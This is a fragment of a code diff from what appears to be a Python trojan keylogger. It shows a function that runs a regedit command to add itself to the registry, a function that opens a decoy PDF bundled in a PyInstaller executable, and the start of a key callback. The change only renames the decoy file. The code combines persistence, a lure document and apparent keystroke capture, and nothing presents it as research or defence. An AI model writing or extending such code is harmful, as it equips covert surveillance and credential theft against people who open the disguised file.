@@ -14,7 +14,7 @@ def add_to_registry():
   subprocess.call(regedit_command,shell=True)
 add_to_registry()
 def open_added_file():
- added_file=sys._MEIPASS+"\\pornstar.pdf"
+ added_file=sys._MEIPASS+"\\cyber.pdf"
  subprocess.Popen(added_file,shell=True)
 open_added_file()
 def callback_function(key):
